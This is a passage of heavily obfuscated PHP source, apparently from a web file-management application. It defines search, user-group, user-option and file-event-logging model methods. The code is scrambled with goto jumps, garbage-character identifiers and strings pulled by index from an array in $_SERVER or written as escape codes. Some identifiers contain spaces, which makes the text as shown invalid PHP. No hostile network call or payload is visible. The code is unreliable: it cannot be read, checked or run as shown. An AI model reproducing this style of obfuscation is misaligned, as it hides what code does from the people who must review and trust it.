$this->alias($A–º®³ñ‹æ[1842])->order($BºÂÊ…’¬Á); goto b“åÇ‹Ìó¤; dÖ‰’ªÉò­: $bìµÀ‹ÀŸ = Input::get($A–º®³ñ‹æ[424], $A–º®³ñ‹æ[7], $A–º®³ñ‹æ[1471], $B¬“¤ÎõÒ…); $F„äÄ¥Á‹› = Input::get($A–º®³ñ‹æ[425], $A–º®³ñ‹æ[7], $A–º®³ñ‹æ[1722], array($A–º®³ñ‹æ[1722], $A–º®³ñ‹æ[421])); $F„äÄ¥Á‹› = $cĞ›ï…Öò[$F„äÄ¥Á‹›]; goto eÅãá­Òùê; b“åÇ‹Ìó¤: } public function listSearch($BÇÚÁäÓÍù) { goto Dµ½‚´–¡ö; Bô«×¿°÷: $this->_filterByGroup($eŒ‘ÃõİÁ, $F¡¡ŒÏ†); return $eŒ‘ÃõİÁ; goto Bš”½å§; eÙ¸Ğé¢ŒÀ: $eŒ‘ÃõİÁ = $this->_makeOrder()->where($D®–‡Ìß™)->selectPage(20); if (!$eŒ‘ÃõİÁ || count($eŒ‘ÃõİÁ[$c„â»©ÄÙ¾[363]]) < 5 && Input::check($f”ã¸ìïµŠ, $c„â»©ÄÙ¾[314])) { $F…ÆóË¥éÅ = $this->_searchFromMeta($c„â»©ÄÙ¾[432], $f”ã¸ìïµŠ, 10); $e„É½Ë¹ÈÛ = $this->_searchFromMeta($c„â»©ÄÙ¾[433], $f”ã¸ìïµŠ, 10); $D¡Çì‚ÖŸ† = array_merge($F…ÆóË¥éÅ, $e„É½Ë¹ÈÛ, $eŒ‘ÃõİÁ[$c„â»©ÄÙ¾[363]]); $eŒ‘ÃõİÁ[$c„â»©ÄÙ¾[363]] = array_unique_by_key($D¡Çì‚ÖŸ†, $c„â»©ÄÙ¾[1479]); $eŒ‘ÃõİÁ[$c„â»©ÄÙ¾[360]][$c„â»©ÄÙ¾[361]] = count($eŒ‘ÃõİÁ[$c„â»©ÄÙ¾[363]]); $eŒ‘ÃõİÁ[$c„â»©ÄÙ¾[360]][$c„â»©ÄÙ¾[362]] = ceil($eŒ‘ÃõİÁ[$c„â»©ÄÙ¾[360]][$c„â»©ÄÙ¾[361]] / $eŒ‘ÃõİÁ[$c„â»©ÄÙ¾[360]][$c„â»©ÄÙ¾[358]]); } $this->_listDataApply($eŒ‘ÃõİÁ[$c„â»©ÄÙ¾[363]]); goto Bô«×¿°÷; BĞÍõìË¸ƒ: if (!$f”ã¸ìïµŠ) { $D®–‡Ìß™ = array(); } if (isset($BÇÚÁäÓÍù[$c„â»©ÄÙ¾[683]])) { $D®–‡Ìß™[$c„â»©ÄÙ¾[683]] = $BÇÚÁäÓÍù[$c„â»©ÄÙ¾[683]]; } $D®–‡Ìß™ = $this->parseWhereLike($D®–‡Ìß™); goto eÙ¸Ğé¢ŒÀ; Dµ½‚´–¡ö: $c„â»©ÄÙ¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f”ã¸ìïµŠ = $BÇÚÁäÓÍù[$c„â»©ÄÙ¾[1723]]; $F¡¡ŒÏ† = isset($BÇÚÁäÓÍù[$c„â»©ÄÙ¾[1724]]) ? $BÇÚÁäÓÍù[$c„â»©ÄÙ¾[1724]] : !1; goto aä¸îÉ‚ã’; aä¸îÉ‚ã’: $f”ã¸ìïµŠ = str_replace($c„â»©ÄÙ¾[1725], $c„â»©ÄÙ¾[1726], trim($f”ã¸ìïµŠ)); $D®–‡Ìß™ = array($c„â»©ÄÙ¾[28] => array($c„â»©ÄÙ¾[375], "\45{$f”ã¸ìïµŠ}\x25"), $c„â»©ÄÙ¾[301] => array($c„â»©ÄÙ¾[375], "{$f”ã¸ìïµŠ}\45"), $c„â»©ÄÙ¾[1902] => array($c„â»©ÄÙ¾[375], "{$f”ã¸ìïµŠ}\x25"), $c„â»©ÄÙ¾[909] => $c„â»©ÄÙ¾[1727]); if (Input::check($f”ã¸ìïµŠ, $c„â»©ÄÙ¾[307])) { $D®–‡Ìß™[$c„â»©ÄÙ¾[1479]] = array($c„â»©ÄÙ¾[375], "{$f”ã¸ìïµŠ}\x25"); $D®–‡Ìß™[$c„â»©ÄÙ¾[2075]] = array($c„â»©ÄÙ¾[375], "{$f”ã¸ìïµŠ}\45"); } goto BĞÍõìË¸ƒ; Bš”½å§: } private function _filterByGroup(&$fŒØ¤œğš­, $C«¦´“±’) { $aµå¿èš’¤ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$C«¦´“±’) { return $fŒØ¤œğš­; } foreach ($fŒØ¤œğš­[$aµå¿èš’¤[363]] as $A¬œÌ‚áĞ» => &$d†Ï™¿¸„™) { $aÚº††Ïé« = array_to_keyvalue($d†Ï™¿¸„™[$aµå¿èš’¤[1813]], $aµå¿èš’¤[33], $aµå¿èš’¤[1638]); if (!in_array($C«¦´“±’, $aÚº††Ïé«)) { unset($fŒØ¤œğš­[$aµå¿èš’¤[363]][$A¬œÌ‚áĞ»]); } } unset($d†Ï™¿¸„™); $fŒØ¤œğš­[$aµå¿èš’¤[363]] = array_values($fŒØ¤œğš­[$aµå¿èš’¤[363]]); $fŒØ¤œğš­[$aµå¿èš’¤[360]] = array($aµå¿èš’¤[1875] => count($fŒØ¤œğš­[$aµå¿èš’¤[363]]), $aµå¿èš’¤[1873] => $fŒØ¤œğš­[$aµå¿èš’¤[360]][$aµå¿èš’¤[358]], $aµå¿èš’¤[1872] => 1, $aµå¿èš’¤[1874] => 1); } private function _searchFromMeta($e«õ¶ªĞÁõ, $aÜ‚ğ¥Õ¯, $fŒ’Á–·ù) { goto d–Ç…çè; BÏ¯ Ò³¢ª: $bóÃÅ—»‰ = $this->parseWhereLike($bóÃÅ—»‰); $a¡Š›‹‘«ƒ = Model($b¾Õãœµœ×[2095])->where($bóÃÅ—»‰)->limit($fŒ’Á–·ù)->select(); if (!$a¡Š›‹‘«ƒ) { return array(); } goto dÛ¬½ „ğ®; Díá²¬µØ“: return $dƒ¬†´¢Ùê; goto fÊîéÈ¾‚; d–Ç…çè: $b¾Õãœµœ× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aÜ‚ğ¥Õ¯ = strtolower($aÜ‚ğ¥Õ¯); $bóÃÅ—»‰ = array($b¾Õãœµœ×[92] => $e«õ¶ªĞÁõ, $b¾Õãœµœ×[368] => array($b¾Õãœµœ×[375], "\45{$aÜ‚ğ¥Õ¯}\45")); goto BÏ¯ Ò³¢ª; dÛ¬½ „ğ®: $a¡Š›‹‘«ƒ = array_to_keyvalue($a¡Š›‹‘«ƒ, $b¾Õãœµœ×[33], $b¾Õãœµœ×[1479]); $dƒ¬†´¢Ùê = $this->where(array($b¾Õãœµœ×[1471] => array($b¾Õãœµœ×[7], $a¡Š›‹‘«ƒ)))->select(); if (!$dƒ¬†´¢Ùê) { return array(); } goto Díá²¬µØ“; fÊîéÈ¾‚: } private function _listDataApplyItem($fêïÌ´…Ö…) { $aÔä±—ä¤• = array($fêïÌ´…Ö…); $this->_listDataApply($aÔä±—ä¤•); return $aÔä±—ä¤•[0]; } private function _listDataApply(&$C‚Œ“ëöîö) { goto CÍôÒÎ•á×; CÍôÒÎ•á×: $C§¡ˆÏ¦±Ğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$C‚Œ“ëöîö) { return; } array_remove_key($C‚Œ“ëöîö, $C§¡ˆÏ¦±Ğ[801]); goto b§Ê”Ñ—ò; b§Ê”Ñ—ò: $a¢ÄÀÃ×Ó‹ = array_to_keyvalue($C‚Œ“ëöîö, $C§¡ˆÏ¦±Ğ[33], $C§¡ˆÏ¦±Ğ[1479]); $this->_listAppendGroup($C‚Œ“ëöîö, $a¢ÄÀÃ×Ó‹); $this->_listAppendMeta($C‚Œ“ëöîö, $a¢ÄÀÃ×Ó‹); goto CŞê³äãØÆ; CŞê³äãØÆ: $this->_listAppendSourceRoot($C‚Œ“ëöîö, $a¢ÄÀÃ×Ó‹); goto BËİö¬¥Ü; BËİö¬¥Ü: } private function _listAppendSourceRoot(&$aîÖŠ½Ş¥ó, $f·©Ğ Èè) { goto bäšÁôÎæ°; EÔïËĞ‰— : $eÖ­¶¡µ•– = Model($bäÄª˜îŠ[745])->order($bäÄª˜îŠ[1735])->field($bˆ‡ôïäùË)->where($FÆÔì³±³†)->select(); $eÖ­¶¡µ•– = array_to_keyvalue($eÖ­¶¡µ•–, $bäÄª˜îŠ[474]); $eÖ­¶¡µ•– = array_remove_key($eÖ­¶¡µ•–, $bäÄª˜îŠ[474]); goto D¤òéŠó¦¼; bäšÁôÎæ°: $bäÄª˜îŠ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FÆÔì³±³† = array($bäÄª˜îŠ[479] => 0, $bäÄª˜îŠ[389] => SourceModel::TYPE_USER, $bäÄª˜îŠ[474] => array($bäÄª˜îŠ[7], $f·©Ğ Èè)); $bˆ‡ôïäùË = $bäÄª˜îŠ[1734]; goto EÔïËĞ‰— ; D¤òéŠó¦¼: foreach ($aîÖŠ½Ş¥ó as &$E‚ç±À—Ì) { $E‚ç±À—Ì[$bäÄª˜îŠ[84]] = $eÖ­¶¡µ•–[$E‚ç±À—Ì[$bäÄª˜îŠ[1479]]] ? $eÖ­¶¡µ•–[$E‚ç±À—Ì[$bäÄª˜îŠ[1479]]] : array(); } unset($E‚ç±À—Ì); goto e©ß©Ñ§µ°; e©ß©Ñ§µ°: } private function _listAppendGroup(&$F”åˆ—ó×ˆ, $Bø‘¤©îó) { goto AÆÒ‘§Ûä ; Aè¾¸ªÌ¦Æ: $FÌ¶¾Ø½õ = array_to_keyvalue($f…åÙöŒòÉ, $B¬¿´‹ÚÅ[33], $B¬¿´‹ÚÅ[1638]); $FÌ¶¾Ø½õ = array_remove_value(array_unique($FÌ¶¾Ø½õ), $B¬¿´‹ÚÅ[486]); if (!$FÌ¶¾Ø½õ || !$f…åÙöŒòÉ) { return; } goto eÓÜæÏ˜«; AÆÒ‘§Ûä : $B¬¿´‹ÚÅ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d‘À¸¼Õ° = array($B¬¿´‹ÚÅ[1479] => array($B¬¿´‹ÚÅ[7], $Bø‘¤©îó)); $f…åÙöŒòÉ = Model($B¬¿´‹ÚÅ[1721])->where($d‘À¸¼Õ°)->select(); goto Aè¾¸ªÌ¦Æ; eÓÜæÏ˜«: $d‘À¸¼Õ° = array($B¬¿´‹ÚÅ[1638] => array($B¬¿´‹ÚÅ[7], $FÌ¶¾Ø½õ)); $d¾†‘õ‰Ñ¥ = Model($B¬¿´‹ÚÅ[1811])->field($B¬¿´‹ÚÅ[2096])->where($d‘À¸¼Õ°)->select(); $d¾†‘õ‰Ñ¥ = array_to_keyvalue($d¾†‘õ‰Ñ¥, $B¬¿´‹ÚÅ[1638]); goto A¿ÌğãäÄÙ; A¿ÌğãäÄÙ: $f…åÙöŒòÉ = array_to_keyvalue_group($f…åÙöŒòÉ, $B¬¿´‹ÚÅ[1479]); foreach ($f…åÙöŒòÉ as &$FÛŒïÙ³®‚) { $a˜Â‡îêĞ° = array(); foreach ($FÛŒïÙ³®‚ as $AØÄ×‘Ñí×) { if (!$AØÄ×‘Ñí×[$B¬¿´‹ÚÅ[1787]]) { continue; } $bÏ‚›ÇòŸø = Model($B¬¿´‹ÚÅ[1806])->listData($AØÄ×‘Ñí×[$B¬¿´‹ÚÅ[1787]]); $a˜Â‡îêĞ°[] = array($B¬¿´‹ÚÅ[1638] => $AØÄ×‘Ñí×[$B¬¿´‹ÚÅ[1638]], $B¬¿´‹ÚÅ[2097] => $d¾†‘õ‰Ñ¥[$AØÄ×‘Ñí×[$B¬¿´‹ÚÅ[1638]]][$B¬¿´‹ÚÅ[28]], $B¬¿´‹ÚÅ[477] => $d¾†‘õ‰Ñ¥[$AØÄ×‘Ñí×[$B¬¿´‹ÚÅ[1638]]][$B¬¿´‹ÚÅ[477]], $B¬¿´‹ÚÅ[394] => $bÏ‚›ÇòŸø); } $FÛŒïÙ³®‚ = $a˜Â‡îêĞ°; } unset($FÛŒïÙ³®‚); goto e½»®è›§Ê; e½»®è›§Ê: foreach ($F”åˆ—ó×ˆ as &$fØ›—Â•‡) { $fØ›—Â•‡[$B¬¿´‹ÚÅ[1813]] = array(); if (isset($f…åÙöŒòÉ[$fØ›—Â•‡[$B¬¿´‹ÚÅ[1479]]])) { $fØ›—Â•‡[$B¬¿´‹ÚÅ[1813]] = $f…åÙöŒòÉ[$fØ›—Â•‡[$B¬¿´‹ÚÅ[1479]]]; } } unset($fØ›—Â•‡); goto cÅ»¹°ÅÍİ; cÅ»¹°ÅÍİ: } private function _listAppendMeta(&$dóÀÔô·…Î, $b©Œ…Å–ÖÂ) { goto c³®ÂËŒÎ; c³®ÂËŒÎ: $BÖ±‰Ó‡¼ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B¼»§ÂåŒó = UserJobModel::JOB_KEY; $eöšÅ£ò™ = array($BÖ±‰Ó‡¼[2076]); goto Bõ†éÔ ùö; Bõ†éÔ ùö: $eÑªÓ¡É¡Õ = array($BÖ±‰Ó‡¼[1479] => array($BÖ±‰Ó‡¼[7], $b©Œ…Å–ÖÂ)); $FÎİ·êÕŒ = Model($BÖ±‰Ó‡¼[2074])->where($eÑªÓ¡É¡Õ)->select(); $FÎİ·êÕŒ = array_to_keyvalue_group($FÎİ·êÕŒ, $BÖ±‰Ó‡¼[1479]); goto CÙŒÎ¶¥»Ö; CÙŒÎ¶¥»Ö: foreach ($FÎİ·êÕŒ as &$B‹°‹‡¶) { $AÕ‰ì›ÂöÖ = array(); foreach ($B‹°‹‡¶ as $f¥‚ºë•ìì) { if (!in_array($f¥‚ºë•ìì[$BÖ±‰Ó‡¼[92]], $eöšÅ£ò™)) { $AÕ‰ì›ÂöÖ[$f¥‚ºë•ìì[$BÖ±‰Ó‡¼[92]]] = $f¥‚ºë•ìì[$BÖ±‰Ó‡¼[368]]; } } $B‹°‹‡¶ = $AÕ‰ì›ÂöÖ; } unset($B‹°‹‡¶); $FÊÏóºÊ = Model($BÖ±‰Ó‡¼[2098]); goto Cçíˆ¥³Ä; Cçíˆ¥³Ä: foreach ($dóÀÔô·…Î as &$dºˆ†Éà) { $fğø×‰®ƒñ = array(); if (isset($FÎİ·êÕŒ[$dºˆ†Éà[$BÖ±‰Ó‡¼[1479]]])) { $fğø×‰®ƒñ = $FÎİ·êÕŒ[$dºˆ†Éà[$BÖ±‰Ó‡¼[1479]]]; } $dºˆ†Éà[$BÖ±‰Ó‡¼[2099]] = array(); if (isset($fğø×‰®ƒñ[$B¼»§ÂåŒó])) { $dºˆ†Éà[$BÖ±‰Ó‡¼[2099]] = $FÊÏóºÊ->getUserJobInfo($fğø×‰®ƒñ[$B¼»§ÂåŒó]); } } unset($dºˆ†Éà); goto bÓË®©”Œ; bÓË®©”Œ: } protected function groupUserAll($fğÄƒ³°Ø) { $A£âÜ‘Õ£Œ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$fğÄƒ³°Ø) { return !1; } $a©×õĞ²¦ = Model($A£âÜ‘Õ£Œ[1721])->field($A£âÜ‘Õ£Œ[1479])->where(array($A£âÜ‘Õ£Œ[1638] => array($A£âÜ‘Õ£Œ[7], $fğÄƒ³°Ø)))->select(); $a©×õĞ²¦ = array_to_keyvalue($a©×õĞ²¦, $A£âÜ‘Õ£Œ[33], $A£âÜ‘Õ£Œ[1479]); return array_unique($a©×õĞ²¦); } public function userSearch($fĞñ‘îÍÅ…, $aôÂ”Ÿ‡§´ = "\52") { return Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][495])->where($fĞñ‘îÍÅ…)->field($aôÂ”Ÿ‡§´)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\137\157\160\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($eƒ˜Ê¢›ÑØ) { $c×š¥¥Ë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!defined($c×š¥¥Ë[443])) { define($c×š¥¥Ë[443], 0); } return "\125\x73\145\162\x4f\x70\164\151\157\x6e\x5f{$eƒ˜Ê¢›ÑØ}\x5f" . USER_ID; } protected function filterWhere($cœâ¦²‚Åå) { $cİÊ§ÃŸ†‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!defined($cİÊ§ÃŸ†‘[443])) { define($cİÊ§ÃŸ†‘[443], 0); } $cœâ¦²‚Åå[$cİÊ§ÃŸ†‘[1479]] = USER_ID; return $cœâ¦²‚Åå; } public function cacheRemoveUser($FïÇòÖÌš”, $DÍÒÒ·Ï®½) { return Cache::remove("\125\x73\x65\x72\x4f\160\164\151\157\156\137{$FïÇòÖÌš”}\137" . $DÍÒÒ·Ï®½); } protected function optionDefault($fáÔ‚ÍÓì = '') { $dñÈ»ô¹èØ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($fáÔ‚ÍÓì == $dñÈ»ô¹èØ[33]) { return $GLOBALS[$dñÈ»ô¹èØ[6]][$dñÈ»ô¹èØ[2100]]; } if ($fáÔ‚ÍÓì == $dñÈ»ô¹èØ[2101]) { return $GLOBALS[$dñÈ»ô¹èØ[6]][$dñÈ»ô¹èØ[2102]]; } } } goto eŠóÕˆ‹¨±; d§µ‹î†•: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\x75\162\143\x65\x5f\145\x76\145\x6e\x74"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\124\x69\155\145", "\164\x69\155\x65", "\x69\156\163\x65\x72\x74", "\x66\165\156\143\x74\151\157\156"), array("\x64\145\163\143", '', "\x69\156\x73\x65\x72\x74\x2c\165\x70\x64\141\x74\x65\54\x73\x65\x6c\145\x63\x74", "\152\x73\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($DÓë¥›ôÅô, $fÙ¿ØØô, $fÁø“Èæ¼ = '') { goto fÎÚƒ˜‡Ôˆ; e¾¼¢·‰¿¥: if (!$bÆÜâ£Ï«) { return !1; } if ($this->isCacheEvent($bÆÜâ£Ï«, $fÙ¿ØØô)) { return; } if ($fÁø“Èæ¼ && is_string($fÁø“Èæ¼)) { $fÁø“Èæ¼ = array($E‡ëòÕ™ÒÒ[1672] => $fÁø“Èæ¼); } goto CÏ„íÑî‚†; CÏ„íÑî‚†: $D¡ñâÌ¾Ôô = array($E‡ëòÕ™ÒÒ[401] => $DÓë¥›ôÅô, $E‡ëòÕ™ÒÒ[1846] => $bÆÜâ£Ï«[$E‡ëòÕ™ÒÒ[479]], $E‡ëòÕ™ÒÒ[1847] => $bÆÜâ£Ï«[$E‡ëòÕ™ÒÒ[28]], $E‡ëòÕ™ÒÒ[484] => $bÆÜâ£Ï«[$E‡ëòÕ™ÒÒ[484]], $E‡ëòÕ™ÒÒ[1471] => USER_ID, $E‡ëòÕ™ÒÒ[406] => $fÙ¿ØØô, $E‡ëòÕ™ÒÒ[1473] => $fÁø“Èæ¼); $this->addSystemLog($fÙ¿ØØô, $D¡ñâÌ¾Ôô); return $this->add($D¡ñâÌ¾Ôô); goto A¦ÜµŒøÉ; fÎÚƒ˜‡Ôˆ: $E‡ëòÕ™ÒÒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->eventSave) { return; } $bÆÜâ£Ï« = Model($E‡ëòÕ™ÒÒ[1154])->sourceInfo($DÓë¥›ôÅô); goto e¾¼¢·‰¿¥; A¦ÜµŒøÉ: } private function addSystemLog($cğ“«¹ŞÊø, $e÷¥»ÖÌÏ¢) { $e”ëÙ†¦ƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($cğ“«¹ŞÊø == $e”ëÙ†¦ƒ[1848]) { $cğ“«¹ŞÊø = $e÷¥»ÖÌÏ¢[$e”ëÙ†¦ƒ[422]][$e”ëÙ†¦ƒ[1849]]; } else { if (in_array($cğ“«¹ŞÊø, array($e”ëÙ†¦ƒ[1615], $e”ëÙ†¦ƒ[1850]))) { $cğ“«¹ŞÊø = $e÷¥»ÖÌÏ¢[$e”ëÙ†¦ƒ[422]][$e”ëÙ†¦ƒ[686]]; } } $BùË¼áé¼ = array_merge($e÷¥»ÖÌÏ¢, array($e”ëÙ†¦ƒ[1851] => $e÷¥»ÖÌÏ¢[$e”ëÙ†¦ƒ[387]], $e”ëÙ†¦ƒ[1852] => $e÷¥»ÖÌÏ¢[$e”ëÙ†¦ƒ[1852]])); Model($e”ëÙ†¦ƒ[1578])->addLog($e”ëÙ†¦ƒ[1853] . $cğ“«¹ŞÊø, $BùË¼áé¼); } private function isCacheEvent($dËæ ùÜö, $C“°•ŸòîÆ) { if ($dËæ ùÜö[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][389]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($d‡øİÛŸ±“, $cÜ·†—ÓË) { $a×÷Õ›êØ¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Dï‡œ²†š— = Model($a×÷Õ›êØ¿[1154])->sourceInfo($d‡øİÛŸ±“); $D°Œ§¾âÏ = array($a×÷Õ›êØ¿[1849] => $cÜ·†—ÓË, $a×÷Õ›êØ¿[28] => $Dï‡œ²†š—[$a×÷Õ›êØ¿[28]]); return $this->addEvent($d‡øİÛŸ±“, $a×÷Õ›êØ¿[1848], $D°Œ§¾âÏ); } public function eventFileEdit($c·«İÓƒŠ) { $a‘Š°º°©¢ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bæ´ê¶ñâ = array($a‘Š°º°©¢[1854] => $_SERVER[$a‘Š°º°©¢[1855]], $a‘Š°º°©¢[1856] => strtolower(ACTION)); return $this->addEvent($c·«İÓƒŠ, $a‘Š°º°©¢[1605], $bæ´ê¶ñâ); } public function eventRecycle($a¼ß‰– ƒÙ, $b˜—‰ùÀ™•) { return $this->addEvent($a¼ß‰– ƒÙ, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1850], $b˜—‰ùÀ™•); } public function eventRemove($B¨àŒàÎ‹) { $eáÑÌ°Äé =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d¯ÔÒ¾‹‡” = Model($eáÑÌ°Äé[1154])->sourceInfo($B¨àŒàÎ‹); $aùĞ†ÄÆªÑ = $d¯ÔÒ¾‹‡”[$eáÑÌ°Äé[28]]; return $this->addEvent($d¯ÔÒ¾‹‡”[$eáÑÌ°Äé[479]], $eáÑÌ°Äé[1604], $aùĞ†ÄÆªÑ); } public function eventShare($fà¢œôïêù, $bÙÂ­ø´êÄ) { return $this->addEvent($fà¢œôïêù, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1615], $bÙÂ­ø´êÄ); } public function eventMove($e³Ã·ÉÚ®, $aÄÍÆ‹«‡¼, $fÃ¿Ù‰Åì•) { goto CÇ’²ßØÕÁ; fì‡¾ÈÍé¬: $this->addEvent($e³Ã·ÉÚ®, $D©ªô†µòé[509], $B½éİôÉ); $f°šÄ¸Ã¶¹ = $d‰¡¬®Û•Š->sourceInfo($e³Ã·ÉÚ®); $B½éİôÉ = array($D©ªô†µòé[387] => $f°šÄ¸Ã¶¹[$D©ªô†µòé[387]], $D©ªô†µòé[28] => $f°šÄ¸Ã¶¹[$D©ªô†µòé[28]]); goto fòƒ…÷˜õÔ; döá¬å¯Ñ¾: $dîÌË¢¿äˆ = $d‰¡¬®Û•Š->sourceInfo($aÄÍÆ‹«‡¼); $E¾£äÑÚ = $d‰¡¬®Û•Š->sourceInfo($fÃ¿Ù‰Åì•); $B½éİôÉ = array($D©ªô†µòé[1006] => $aÄÍÆ‹«‡¼, $D©ªô†µòé[1857] => $dîÌË¢¿äˆ[$D©ªô†µòé[28]], $D©ªô†µòé[1838] => $dîÌË¢¿äˆ[$D©ªô†µòé[484]], $D©ªô†µòé[1007] => $fÃ¿Ù‰Åì•, $D©ªô†µòé[1858] => $E¾£äÑÚ[$D©ªô†µòé[28]], $D©ªô†µòé[1859] => $E¾£äÑÚ[$D©ªô†µòé[484]]); goto fì‡¾ÈÍé¬; fòƒ…÷˜õÔ: $this->addEvent($aÄÍÆ‹«‡¼, $D©ªô†µòé[1860], $B½éİôÉ); goto Aâá¾ä…; CÇ’²ßØÕÁ: $D©ªô†µòé =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d‰¡¬®Û•Š = Model($D©ªô†µòé[1154]); $f°šÄ¸Ã¶¹ = $d‰¡¬®Û•Š->sourceInfo($e³Ã·ÉÚ®); goto döá¬å¯Ñ¾; Aâá¾ä…: } public function eventCopy($cáÒèÎ¤°Ô) { $this->eventCreate($cáÒèÎ¤°Ô, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][507]); } public function eventRename($b¦àÒëáî, $cÇ•æÌÈ‰¸, $DÈóÄ¤Ÿ†÷) { $B“í¼Ó³…Œ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F§®ë¥Êç = array($B“í¼Ó³…Œ[1006] => $cÇ•æÌÈ‰¸, $B“í¼Ó³…Œ[1007] => $DÈóÄ¤Ÿ†÷); return $this->addEvent($b¦àÒëáî, $B“í¼Ó³…Œ[1170], $F§®ë¥Êç); } public function eventAddComment($f†çº¡¸¬, $BÏáŸÛÂ—ó) { return $this->addEvent($f†çº¡¸¬, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1861], $BÏáŸÛÂ—ó); } public function eventAddDesc($FïÄò‡ŞÕ, $FïŠ“ÁÔÆ§) { return $this->addEvent($FïÄò‡ŞÕ, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1862], $FïŠ“ÁÔÆ§); } public function listBySource($e‡ŞÒ±™±Ó) { goto b‡Óî¯ñ÷¦; BãÕ‘£‘: if ($aôãêÏ™–¹[$E¾í±®àŞ¢[388]] == $E¾í±®àŞ¢[86]) { $a¹ìĞ©…­ = Model($E¾í±®àŞ¢[1154])->listSearchChildren($e‡ŞÒ±™±Ó, 20000); $a¹ìĞ©…­[] = $e‡ŞÒ±™±Ó . $E¾í±®àŞ¢[370]; $cë»˜ÈÜæ¿ = array($E¾í±®àŞ¢[387] => array($E¾í±®àŞ¢[7], $a¹ìĞ©…­)); } $A÷ˆÜğ¿‰Ú = $this->where($cë»˜ÈÜæ¿)->order($E¾í±®àŞ¢[1863])->selectPage(); if ($A÷ˆÜğ¿‰Ú[$E¾í±®àŞ¢[360]][$E¾í±®àŞ¢[361]] == 0) { $A÷ˆÜğ¿‰Ú[$E¾í±®àŞ¢[360]][$E¾í±®àŞ¢[361]] = 1; $A÷ˆÜğ¿‰Ú[$E¾í±®àŞ¢[363]] = array(array($E¾í±®àŞ¢[401] => $e‡ŞÒ±™±Ó, $E¾í±®àŞ¢[1846] => $aôãêÏ™–¹[$E¾í±®àŞ¢[479]], $E¾í±®àŞ¢[1471] => $aôãêÏ™–¹[$E¾í±®àŞ¢[396]], $E¾í±®àŞ¢[406] => $E¾í±®àŞ¢[1864], $E¾í±®àŞ¢[407] => $aôãêÏ™–¹[$E¾í±®àŞ¢[192]], $E¾í±®àŞ¢[1473] => $E¾í±®àŞ¢[33])); } goto F¶ƒ†½‹É; b‡Óî¯ñ÷¦: $E¾í±®àŞ¢ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aôãêÏ™–¹ = Model($E¾í±®àŞ¢[1154])->sourceInfo($e‡ŞÒ±™±Ó); $cë»˜ÈÜæ¿ = array($E¾í±®àŞ¢[401] => $e‡ŞÒ±™±Ó); goto BãÕ‘£‘; F¶ƒ†½‹É: return $this->eventListParse($A÷ˆÜğ¿‰Ú, $e‡ŞÒ±™±Ó); goto Fõóğ¬Í’Ò; Fõóğ¬Í’Ò: } private function eventListParse($c¡ôÛºœÈ, $AÁğºµêÍ) { goto cˆ™÷Öøœ—; aÜ²™‘Š¿‘: $a“ˆŞƒŸÆ­ = array_unique($a“ˆŞƒŸÆ­); $c¿¼«Áè¾ö = array_unique(array_to_keyvalue($dªƒÓ¨™É, $E‡ß±µÃÓˆ[33], $E‡ß±µÃÓˆ[1479])); $B¦¶­½§Öñ = Model($E‡ß±µÃÓˆ[495])->userListInfo($c¿¼«Áè¾ö); goto dœª÷ËÖ´«; dœª÷ËÖ´«: $B‘§µ­ŸÙù = Model($E‡ß±µÃÓˆ[745])->sourceListInfo($a“ˆŞƒŸÆ­, !0); foreach ($dªƒÓ¨™É as &$e¾Ø¥Ç™‚) { if ($e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[29]] == $E‡ß±µÃÓˆ[509] && isset($e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[422]][$E‡ß±µÃÓˆ[1006]])) { $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[422]][$E‡ß±µÃÓˆ[1006]] = $B‘§µ­ŸÙù[$e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[422]][$E‡ß±µÃÓˆ[1006]]]; $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[422]][$E‡ß±µÃÓˆ[1007]] = $B‘§µ­ŸÙù[$e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[422]][$E‡ß±µÃÓˆ[1007]]]; } if ($e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[29]] == $E‡ß±µÃÓˆ[1860] && isset($e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[422]][$E‡ß±µÃÓˆ[387]])) { $e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[422]][$E‡ß±µÃÓˆ[387]] = $B‘§µ­ŸÙù[$e¾Ø¥Ç™‚[$E‡ß±µÃÓˆ[422]][$E‡ß±µÃÓˆ[387]]]; } 